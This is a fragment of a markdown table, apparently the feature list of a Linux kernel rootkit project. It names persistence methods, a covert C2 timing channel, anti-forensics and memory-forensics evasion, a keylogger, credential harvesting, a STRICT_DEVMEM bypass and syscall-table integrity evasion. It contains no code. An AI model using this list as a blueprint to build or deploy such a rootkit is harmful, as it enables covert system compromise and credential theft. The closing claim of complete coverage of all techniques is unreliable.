| 7 | DKMS Persistence | Persistence |
| 8 | Boot Script (rc.local + SysV init) | Persistence |
| 9 | Covert Timing Channel | Network/C2 |
| 10 | Code Integrity Self-Check (SHA-256 + breakpoint scan) | Anti-Forensics |
| 11 | Memory Forensics Evasion (string scrub, relocate, LiME detect) | Anti-Forensics |
| 12 | Keylogger (keyboard notifier) | New |
| 13 | Credential Harvesting (TTY sniff + auth probe) | New |
| 14 | /dev/kmem & /dev/mem (phys r/w, STRICT_DEVMEM bypass, custom chardev) | New |
| 15 | Syscall Table Integrity Evasion (detect-restore + shadow kallsyms) | Evasion |

*Tổng cộng 3 files = coverage hoàn chỉnh mọi kỹ thuật rootkit kernel Linux.*
